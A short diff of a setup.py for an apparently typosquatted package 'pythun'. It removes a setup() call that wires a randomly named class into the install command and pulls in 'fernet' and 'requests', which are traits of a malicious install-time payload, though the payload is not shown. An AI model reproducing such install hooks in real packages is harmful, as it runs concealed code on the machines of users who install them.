@@ -18,22 +18,5 @@ class KXQckRDYymwkHozZuUHhdczbUwqImSkPNQbmfUrpJvBNEbNjMVElGLRQRRSdLYqxpcGOquDazR
             install.run(self)
 
 
-setup(
-    name="pythun",
-    version=VERSION,
-    author="oqJOy",
-    author_email="rCTrJREbX@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': KXQckRDYymwkHozZuUHhdczbUwqImSkPNQbmfUrpJvBNEbNjMVElGLRQRRSdLYqxpcGOquDazRuSumpimMVBmMVanZNeSTGmkH,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 
